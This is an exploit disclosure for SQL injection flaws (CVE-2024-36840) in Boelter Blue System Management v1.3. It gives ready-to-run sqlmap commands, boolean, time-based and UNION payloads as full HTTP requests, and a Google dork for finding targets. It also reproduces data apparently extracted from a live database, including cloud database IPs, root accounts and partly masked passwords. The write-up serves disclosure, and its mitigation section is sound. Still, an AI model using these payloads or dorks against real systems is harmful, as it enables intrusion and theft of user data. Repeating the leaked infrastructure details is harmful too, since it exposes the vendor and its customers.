# Multiple SQL Injection Vulnerabilities in Boelter Blue System Management v1.3

**Discovered by**: [CBKB] - DeadlyData, R4d1x  
**Date**: 2024-05-27  
**Affected Software**: Boelter Blue System Management 
**CVE**: CVE-2024-36840  
**Version**: 1.3  
**Google Dork**: "Powered by Boelter Blue"  
**Vendor**: Boelter Blue ([boelter.com](https://www.boelter.com/))  
**Software Link**: [Google Play Store](https://play.google.com/store/apps/details?id=com.anchor5digital.anchor5adminapp&hl=en_US)  
**Tested on**: Linux Debian 9 (stretch), Apache 2.4.25, MySQL >= 5.0.12  

## Overview

Boelter Blue System Management v1.3 has been found to contain multiple critical SQL injection vulnerabilities. These vulnerabilities allow attackers to execute arbitrary SQL queries, potentially leading to sensitive data exposure, unauthorized access, and complete control over the affected database.

## Affected Component##
> news_details.php  
> services.php  
> location_details.php

>  - id parameter
>  - section parameter

  
## PoC Example
**SQLMap Injection**:   
`sqlmap -u "https://www.example.com/news_details.php?id=10071" --random-agent --dbms=mysql --dbs`


**news_details.php?id** parameter:  
   `sqlmap -u "https://www.example.com/news_details.php?id=10071" --random-agent --dbms=mysql --threads=4 --dbs`
   
**services.php?section** parameter:  
   `sqlmap -u "https://www.example.com/services.php?section=5081" --random-agent --tamper=space2comment --threads=8 --dbs`
   
**location_details.php?id** parameter:  
   `sqlmap -u "https://www.example.com/location_details.php?id=836" --random-agent --dbms=mysql --dbs`




## Injection Types:

    Boolean-based blind
    Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=10071 AND 1452=1452
    
    
    Time-based blind
    Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=10071 AND (SELECT 5588 FROM (SELECT(SLEEP(5)))UtkO)
    
    Union-based injection
    Parameter: id (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: id=-5298 UNION ALL SELECT NULL,NULL,CONCAT(0x717a787671,0x4d7065654c5a5547576a676c6c4d676f574b475a504a5369644c636a57525a7478684c4f56676561,0x71767a7671),NULL,NULL,NULL,NULL,NULL-- -



## HTTP Requests:

    Boolean-based blind
    
        GET /news_details.php?id=10071 AND 1452=1452 HTTP/1.1
        Host: [target_website]
        User-Agent: [Your User-Agent]
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Connection: keep-alive
        Upgrade-Insecure-Requests: 1
    
    
    Time-based blind
    
        GET /news_details.php?id=10071 AND (SELECT 5588 FROM (SELECT(SLEEP(5)))UtkO) HTTP/1.1
        Host: [target_website]
        User-Agent: [Your User-Agent]
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Connection: keep-alive
        Upgrade-Insecure-Requests: 1
    
    
    Union-based injection
    
        GET /news_details.php?id=-5298 UNION ALL SELECT NULL,NULL,CONCAT(0x717a787671,0x4d7065654c5a5547576a676c6c4d676f574b475a504a5369644c636a57525a7478684c4f56676561,0x71767a7671),NULL,NULL,NULL,NULL,NULL-- - HTTP/1.1
        Host: [target_website]
        User-Agent: [Your User-Agent]
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Connection: keep-alive
        Upgrade-Insecure-Requests: 1



## Impact

These vulnerabilities can be exploited to achieve the following:

-   **Data Exfiltration**: Admin credentials, user email/password hashes, device hashes, user PII, purchase history, and database credentials.
-   **Remote Code Execution**: Through execution of arbitrary SQL queries.
-   **Account Takeover**: By retrieving and decrypting user credentials.
-   **Full Database Access**: Ability to read, modify, and delete any data in the database.

## Technical Details

### Database Information

**DBMS**: MySQL >= 5.0.12  
**Web Server**: Apache 2.4.25  
**Operating System**: Linux Debian 9 (stretch)

#### Extracted Databases

    available databases [5]:
    [*] Anchor5Digital
    [*] information_schema
    [*] mysql
    [*] performance_schema
    [*] sys


#### Sample Extracted Data

**Database: Anchor5Digital**

**Table: DatabaseConnection**

    +----+-----------------+--------------------------------------------------------+---------------+------------------------------------+----------+------------+----------------+
    | id | ip              | url                                                    | name          | mainURL                            | username | password   | displayName    |
    +----+-----------------+--------------------------------------------------------+---------------+------------------------------------+----------+------------+----------------+
    | 1  | 104.197.215.116 | /cloudsql/patrick-cudahy:us-central1:patrick-cudahy-db | PatrickCudahy | https://patrick-cudahy.appspot.com | root     | S0lu****   | Patrick cuda** |
    | 2  | 35.184.62.89    | /cloudsql/our-event-app:us-central1:oureventapp-db     | OurEventApp   | https://our-event-app.appspot.com  | root     | S0lu****   | OurEventApp    |
    +----+-----------------+--------------------------------------------------------+---------------+------------------------------------+----------+------------+----------------+


**Table: Payment**

    +----------------+-------------+
    | Column         | Type        |
    +----------------+-------------+
    | type           | varchar(20) |
    | amount         | varchar(20) |
    | auth_code      | varchar(50) |
    | business_id    | int(11)     |
    | id             | int(11)     |
    | paymentDate    | varchar(50) |
    | people_id      | int(11)     |
    | processor      | varchar(20) |
    | transaction_id | varchar(30) |
    +----------------+-------------+

**Table: system_user**

    +-----------+
    | Host      |
    +-----------+
    | %         |
    | 127.0.0.1 |
    | 127.0.0.1 |
    | ::1       |
    | localhost |
    | localhost |
    | localhost |
    | localhost |
    +-----------+

    +-----------------+
    | User            |
    +-----------------+
    | cloudsqlexport  |
    | cloudsqlimport  |
    | cloudsqlimport  |
    | cloudsqloneshot |
    | cloudsqlreplica |
    | root            |
    | root            |
    | root            |
    +-----------------+


## Mitigation

To mitigate these vulnerabilities, it is recommended to:

-   **Validate and Sanitize User Inputs**: Ensure that all user-supplied data is properly validated and sanitized before being processed by the application.
-   **Use Parameterized Queries**: Implement parameterized queries or prepared statements to prevent SQL injection.
-   **Implement a WAF**: Deploy a Web Application Firewall to detect and block SQL injection attempts.

## References

-   [Boelter Blue Homepage](https://www.boelter.com/)
-   [Google Play Store](https://play.google.com/store/apps/details?id=com.anchor5digital.anchor5adminapp&hl=en_US)
-   [CVE - MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-36840)

## Disclosure Timeline

-   **2023**: Vulnerabilities discovered by CBKB team.
-   **2023**: Vendor notified.
-   **2024**: Vendor notified.
-   **2024-05-27**: Public disclosure and CVE request submitted.
-   **2024-06-4**: RESERVED CVE By mitre
-   **2024-06-4**: Exploit disclosed to exploit-db
-   **2024-06-4**: Exploit disclosed to packetstorm

## CVE Information

-   **CVE ID**: [CVE-2024-36840](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-36840)

## Contact Information

For any questions or concerns regarding this vulnerability, please contact us at: infosecdb@protonmail.com

----------

[CBKB]-   DeadlyData, 
[CBKB]-   R4d1x


